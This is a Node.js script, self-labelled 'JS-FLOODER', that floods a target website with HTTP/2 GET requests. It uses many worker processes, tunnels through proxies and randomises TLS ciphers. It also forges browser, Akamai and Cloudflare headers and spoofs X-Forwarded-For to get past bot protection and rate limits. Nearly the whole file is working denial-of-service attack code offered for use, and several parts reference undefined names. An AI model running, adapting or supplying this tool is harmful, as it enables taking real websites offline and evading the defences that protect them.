const url = require('url')
	, fs = require('fs')
	, http2 = require('http2')
	, http = require('http')
	, tls = require('tls')
	, net = require('net')
	, request = require('request')
	, cluster = require('cluster')
const v8 = require("v8");
const crypto = require('crypto');
const os = require("os");
const HPACK = require('hpack');
const { resolve } = require("path");
const errorHandler = error => {
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
try {
	var colors = require('colors');
} catch (err) {
	console.log('\x1b[36mInstalling\x1b[37m the requirements');
	execSync('npm install colors');
	console.log('Done.');
	process.exit();
}
function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}
cplist = [
		'TLS_AES_128_CCM_8_SHA256',
		'TLS_AES_128_CCM_SHA256',
		'TLS_CHACHA20_POLY1305_SHA256',
		'TLS_AES_256_GCM_SHA384',
		'TLS_AES_128_GCM_SHA256'
		, ]
const sigalgs = [
	'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512'
	, 'ecdsa_brainpoolP256r1tls13_sha256'
	, 'ecdsa_brainpoolP384r1tls13_sha384'
	, 'ecdsa_brainpoolP512r1tls13_sha512'
	, 'ecdsa_sha1'
	, 'ed25519'
	, 'ed448'
	, 'ecdsa_sha224'
	, 'rsa_pkcs1_sha1'
	, 'rsa_pss_pss_sha256'
	, 'dsa_sha256'
	, 'dsa_sha384'
	, 'dsa_sha512'
	, 'dsa_sha224'
	, 'dsa_sha1'
	, 'rsa_pss_pss_sha384'
	, 'rsa_pkcs1_sha2240'
	, 'rsa_pss_pss_sha512'
	, 'sm2sig_sm3'
	, 'ecdsa_secp521r1_sha512'
, ];
let concu = sigalgs.join(':');

controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
	cipher() {
		return cplist[Math.floor(Math.random() * cplist.length)];
	}
, }

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);


const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];
let input = 'bypass';
let query = 'false';
// Validate input
if (!target || !time || !thread || !proxyFile || !rps || !input) {
	console.log('JS-FLOODER'.bgRed)
	console.error(`Example: node ${process.argv[1]} url time thread proxy.txt rate bypass/flood query(true/false)`.rainbow);
 console.log('default : query : true'.red);
	process.exit(1);
}
if (!/^https?:\/\//i.test(target)) {
	console.error('sent with http:// or https://');
	process.exit(1);
}
proxyr = proxyFile
if (isNaN(rps) || rps <= 0) {
	console.error('number rps');
	process.exit(1);
}
const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 100;
if (cluster.isMaster) {
	//console.clear()
	console.log("HEAP SIZE:", v8.getHeapStatistics().heap_size_limit / (1024 * 1024));
  console.log("@CRISXTOP".bgRed);
	for (let counter = 1; counter <= thread; counter++) {
		cluster.fork();
	}
	const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage percentage exceeded:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	setTimeout(() => process.exit(-1), time * 1000);
} else {
	setInterval(flood)
}

function flood() {
	var parsed = url.parse(target);
	var cipper = headerFunc.cipher();
	var proxy = proxyr.split(':');



	let interval
if (input === 'flood') {
	interval = 1000;
  } else if (input === 'bypass') {
	function randomDelay(min, max) {
	  return Math.floor(Math.random() * (max - min + 1)) + min;
	}

	// T?o m?t ?? tr? ng?u nhi?n t? 1000 ??n 5000 mili gi?y
	interval = randomDelay(1000, 5000);
  } else {
	interval = 1000;
  }
	function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}

	function randstr(minLength, maxLength) {
		const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
const randomStringArray = Array.from({ length }, () => {
const randomIndex = Math.floor(Math.random() * characters.length);
return characters[randomIndex];
});

return randomStringArray.join('');
}

	const randstrsValue = randstr(25);
	
 	






function generateRandomString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
const hd = {}
 function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
function eko(_0x386b59, _0x1cc8e4) {
	const _0x2b44d8 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
		  _0x3c9cf3 = Math.floor(Math.random() * (_0x1cc8e4 - _0x386b59 + 1)) + _0x386b59,
		  _0x4f7232 = Array.from({
	  "length": _0x3c9cf3
	}, () => {
	  const _0x2aa914 = Math.floor(Math.random() * _0x2b44d8.length);
  
	  return _0x2b44d8[_0x2aa914];
	});
  
	return _0x4f7232.join("");
  }
  const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx"];
const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};
const generateHeaders = (browser) => {
    const versions = {
        chrome: { min: 115, max: 124 },
        safari: { min: 12, max: 16 },
        brave: { min: 115, max: 124 },
        firefox: { min: 99, max: 112 },
        mobile: { min: 85, max: 105 },
        opera: { min: 70, max: 90 },
        operagx: { min: 70, max: 90 }
    };

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
    const fullVersions = {
        brave: "90.0.4430.212",
        chrome: "90.0.4430.212",
        firefox: "88.0",
        safari: "14.1",
        mobile: "90.0.4430.212",
        opera: "90.0.4430.212",
        operagx: "90.0.4430.212"
    };

    // T?o header "Sec-CH-UA-Full-Version-List" t? gi? tr? full version
    const secChUAFullVersionList = Object.keys(fullVersions)
        .map(key => `"${key}";v="${fullVersions[key]}"`)
        .join(", ");
    const platforms = {
        chrome: "Win64",
        safari: "macOS",
        brave: "Linux",
        firefox: "Linux",
        mobile: "Android",
        opera: "Linux",
        operagx: "Linux"
    };
    const platform = platforms[browser];

    const userAgent = {
        chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${version}_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15`,
        brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`,
        mobile: `Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36`,
        opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        operagx: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`
    };
    const secFetchUser = Math.random() <0.75 ?"?1;?1":"?1";
    const secChUaMobile = browser === "mobile" ? "?1" : "?0";
    const acceptEncoding = Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br";
    const accept = Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "application/json";
    const headersMap = {
        brave: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsed.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsed.host + (Math.random() < 0.5 ? '.' : '')),
            ":scheme": "https",
            ":path": parsed.path,
            "sec-ch-ua": `Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            "Pragma": "no-cache",
            'user-agent': process.argv[8],
            'cookie' :process.argv[7] ,
            "sec-fetch-user":  `${secFetchUser}`,
            "accept-encoding": `${acceptEncoding}`,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.brave
        },
        chrome: {
            ":method": "GET",
            ":authority":Math.random() < 0.5 ? parsed.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsed.host + (Math.random() < 0.5 ? '.' : '')),
            ":scheme": "https",
            ":path":parsed.path,
            "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            "Pragma": "no-cache",
            'user-agent': process.argv[8],
            'cookie' :process.argv[7] ,
            "sec-fetch-user":  `${secFetchUser}`,
            "accept-encoding": `${acceptEncoding}`,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.chrome
        },
        firefox: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsed.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsed.host + (Math.random() < 0.5 ? '.' : '')),
            ":scheme": "https",
            ":path": parsed.path,
            "sec-ch-ua": `"Firefox";v="${version}", "Gecko";v="20100101", "Mozilla";v="${version}"`,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            "Pragma": "no-cache",
            'user-agent': process.argv[8],
            'cookie' :process.argv[7] ,
            "sec-fetch-user":  `${secFetchUser}`,
            "accept-encoding": `${acceptEncoding}`,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.firefox
        },
        safari: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsed.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsed.host + (Math.random() < 0.5 ? '.' : '')),
            ":scheme": "https",
            ":path": parsed.path,
            "sec-ch-ua": `"Safari";v="${version}", "AppleWebKit";v="605.1.15", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            "Pragma": "no-cache",
            'user-agent': process.argv[8],
            'cookie' :process.argv[7] ,
            "sec-fetch-user":  `${secFetchUser}`,
            "accept-encoding": `${acceptEncoding}`,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.safari
        },
        mobile: {
            ":method": "GET",
            ":authority":Math.random() < 0.5 ? parsed.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsed.host + (Math.random() < 0.5 ? '.' : '')),
            ":scheme": "https",
           ":path": parsed.path,
            "sec-ch-ua": `"Chromium";v="${version}", "Mobile";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            "Pragma": "no-cache",
           'user-agent': process.argv[8],
            'cookie' :process.argv[7] ,
            "sec-fetch-user":  `${secFetchUser}`,
            "accept-encoding": `${acceptEncoding}`,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.mobile
        },
        opera: {
            ":method": "GET",
            ":authority":Math.random() < 0.5 ? parsed.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsed.host + (Math.random() < 0.5 ? '.' : '')),
            ":scheme": "https",
           ":path": parsed.path,
            "sec-ch-ua": `"Chromium";v="${version}", "Opera";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            "Pragma": "no-cache",
            'user-agent': process.argv[8],
            'cookie' :process.argv[7] ,
            "sec-fetch-user":  `${secFetchUser}`,
            "accept-encoding": `${acceptEncoding}`,
            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.opera
        },
        operagx: {
            ":method": "GET",
            ":authority":Math.random() < 0.5 ? parsed.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsed.host + (Math.random() < 0.5 ? '.' : '')),
            ":scheme": "https",
            ":path": parsed.path,
            "sec-ch-ua": `"Chromium";v="${version}", "Opera GX";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": `${secChUaMobile}`,
            "accept": `${accept}`,
            "Pragma": "no-cache",
            'user-agent': process.argv[8],
            'cookie' :process.argv[7] ,
            "sec-fetch-user":  `${secFetchUser}`,
            "accept-encoding": `${acceptEncoding}`,
           "accept-language": "ru,en-US;q=0.9,en;q=0.8",
           "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.operagx
        }
    };

    return headersMap[browser];
};
const browser = getRandomBrowser();
const headers = generateHeaders(browser);
function getWeightedRandom() {
    const randomValue = Math.random() * Math.random();
    return randomValue < 0.25;
}
const urihost = [
    'google.com',
    'youtube.com',
    'facebook.com',
    'baidu.com',
    'wikipedia.org',
    'twitter.com',
    'amazon.com',
    'yahoo.com',
    'reddit.com',
    'netflix.com'
];
clength = urihost[Math.floor(Math.random() * urihost.length)]
const randomString = randstr(10);
const rateHeaders1 = [
{"source-ip" : randstr(5)},
{"Vary" : randstr(5)},
{"Attribution-Reporting-Eligible" : "trigger"},
];
const rateHeaders2 = [
{ "TTL-3": "1.5" },
{"From-Unknown-Botnet" : "Crisx12012"},
];
const rateHeaders3 = [
{ "A-IM": "Feed" },
{"dnt" : 1},
{"content-security-policy-report-only": "report-uri https://reporting.go-mpulse.net/report/FDSGP-LEB9B-T8Y2A-5V5ED-9WX2T"},
];
const rateHeaders4 = [
{"Service-Worker-Navigation-Preload" : "true"},
{"Supports-Loading-Mode" : "credentialed-prerender"},
{ "pragma": "no-cache" },
{ "data-return" : "false"},
];
		const rhd = [
			{'RTT': Math.floor(Math.random() * (400 - 600 + 1)) + 100},
      {"X-Forwarded-Proto": "https"},
			{'Nel': '{ "report_to": "name_of_reporting_group", "max_age": 12345, "include_subdomains": false, "success_fraction": 0.0, "failure_fraction": 1.0 }'},
		]
		const hd1 = [
			{'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
      {'Delta-Base' : '12340001'},
       {"te": "trailers"},
		]
		const headers4 = {
			...(Math.random() < 0.5 ?{"akamai-grn": "0.14965468.1718719936.1009b53"} : {} ),
			
				 ...(Math.random() < 0.5 ?{"x-akam-sw-version": "0.5.0"} : {} ),
			...(Math.random() < 0.5 ?{"x-akamai-transformed": "9 - 0 pmb=mNONE,1mTOE,1mRUM,4"} : {} ),
			...(getWeightedRandom() && Math.random() < 0.4 && { 'x-forwarded-for': `${randomString}:${randomString}` }),
				...(Math.random() < 0.75 ?{"referer": "https:/" +clength} :{}),
				...(Math.random() < 0.75 ?{"origin": Math.random() < 0.5 ? "https://" + clength + (Math.random() < 0.5 ? ":" + randnum(4) + '/' : '@root/'): "https://"+ (Math.random() < 0.5 ?'root-admin.': 'root-root.') +clength}:{}),
			}
                        dyn = {
                            ...(Math.random() < 0.5 ?{"cf-mitigated": "challenge"} : {} ),
                            ...(Math.random() < 0.5 ?{"origin-agent-cluster": "?1"} : {} ),
                            ...(Math.random() < 0.5 ? {"Observe-Browsing-Topics" : "?1"} : {}),
                        ...(Math.random() < 0.5 ?{['client-x-with-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} : {}),
	...(Math.random() < 0.5 ?{['cf-sec-with-from-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} : {}),
 ...(Math.random() < 0.5 ?{['user-x-with-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} : {}),			  
 ['nodejs-c-python-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12),	

},
                      dyn2 = {
                        ...(Math.random() < 0.5 ?{"upgrade-insecure-requests": "1"} : {}),
                        ...(Math.random() < 0.5 ? { "purpose": "prefetch"} : {} ),
                      }  
	const agent = new http.Agent({
		host: proxy[0]
		, port: proxy[1]
		, keepAlive: true
		, keepAliveMsecs: 500000000
		, maxSockets: 50000
		, maxTotalSockets: 100000
	, });
	const Optionsreq = {
		agent: agent
		, method: 'CONNECT'
		, path: parsed.host + ':443'
		, timeout: 1000
		, headers: {
			'Host': parsed.host
			, 'Proxy-Connection': 'Keep-Alive'
			, 'Connection': 'Keep-Alive'
			
		, }
	, };
	connection = http.request(Optionsreq, (res) => {});
	const TLSOPTION = {
		ciphers: cipper
		, secureProtocol: ["TLSv1_3_method"]
		, sigals: concu
		, secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom
		, echdCurve: "X25519"
		, secure: true
		, rejectUnauthorized: false
		, ALPNProtocols: ['h2']
	, };

	function createCustomTLSSocket(parsed, socket) {
		const tlsSocket = tls.connect({
			...TLSOPTION
			, host: parsed.host
			, port: 443
			, servername: parsed.host
			, socket: socket
		});
		//console.log('succes connect ')
		tlsSocket.setKeepAlive(true, 60000);
        tlsSocket.allowHalfOpen = true;
        tlsSocket.setNoDelay(true);
        tlsSocket.setMaxListeners(0);
		return tlsSocket;
	}
	  
	 function shuffleObject(obj) {
					const keys = Object.keys(obj);
				  
					for (let i = keys.length - 1; i > 0; i--) {
					  const j = Math.floor(Math.random() * (i + 1));
					  [keys[i], keys[j]] = [keys[j], keys[i]];
					}
				  
					const shuffledObject = {};
					for (const key of keys) {
					  shuffledObject[key] = obj[key];
					}
				  
					return shuffledObject;
				  }
                
	connection.on('connect', function(res, socket) {
		
    socket.setKeepAlive(true, 60000);
		const tlsSocket = createCustomTLSSocket(parsed, socket);

		function getDynamicSettings() {
			return {
				headerTableSize: 65536,
				initialWindowSize: Math.random() < 0.5 ? 6291456 : 33554432,
				maxHeaderListSize: 262144,
				enablePush: false,
				maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
				maxFrameSize: 16384,
				enableConnectProtocol: false,
			};
		}
    shit = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
	   const clients = [];
const client = http2.connect(parsed.href, {
		settings: getDynamicSettings(),
   createConnection: () => tlsSocket,
   "unknownProtocolTimeout": 5,
        "maxReservedRemoteStreams": 10000,
        "maxSessionMemory": 6 * 1024 * 1024 * 1024,
	}, (session) => {
    session.setLocalWindowSize(shit, 0);
});
clients.push(client);

client.on("connect", () => {
    setInterval(async () => {
        for (let i = 0; i < rps; i++) {
            let retries = 5;
            let backoff = 1000;
			const randomItem = (array) => array[Math.floor(Math.random() * array.length)];
            const sendRequest = async () => {
                try {
                    var head = {
                        ...(Math.random() < 0.5 && { rhd: [randomItem(rhd)] }),
                ...(Math.random() < 0.5 && { hd1: [randomItem(hd1)] }),
                ...randomItem(rateHeaders1),
                ...randomItem(rateHeaders2),
                ...randomItem(rateHeaders3),
                ...randomItem(rateHeaders4),
				...dyn,
				...dyn2,
				...headers4,
                        ...headers,
                    };

                    const requests = [];

                    for (let j = 0; j < 3; j++) { // Send 3 requests per iteration
                        const request = client.request({
                ...head
                        }, {
                            "exclusive": true,
                            "weight": 256,
                            "waitForTrailers": true,
                            "endStream": true
                        });

                        request.on('response', (headers) => {
                            if (headers[':status'] === 429) { // Check if rate limited
                                throw new Error('Rate limited');
                            }
                        });

                        requests.push(request);
                    }

                    // End all requests concurrently
                    await Promise.all(requests.map(req => req.end()));

                } catch (error) {
                    if (retries > 0) {
                        retries--;
                        setTimeout(sendRequest, backoff);
                        backoff *= 2; // Exponential backoff
                    } else {
                        console.error("Request failed after retries: ", error);
                    }
                }
            };

            // Start sending requests
            sendRequest();
        }
    }, 2000); // Interval between batches of requests
});


		client.on("close", () => {
			client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return
		});




client.on("error", error => {
    if (error.code === 'ERR_HTTP2_GOAWAY_SESSION') {
        console.log('Received GOAWAY error, pausing requests for 10 seconds\r');
        shouldPauseRequests = true;
        setTimeout(() => {
           
            shouldPauseRequests = false;
        },2000);
    } else if (error.code === 'ECONNRESET') {
        
        shouldPauseRequests = true;
        setTimeout(() => {
            
            shouldPauseRequests = false;
        }, 2000);
    }  else {
    }

    client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return
});

	});


	connection.on('error', (error) => {
		connection.destroy();
		if (error) return;
	});
	connection.on('timeout', () => {
		connection.destroy();
		return
	});
	connection.end();
}//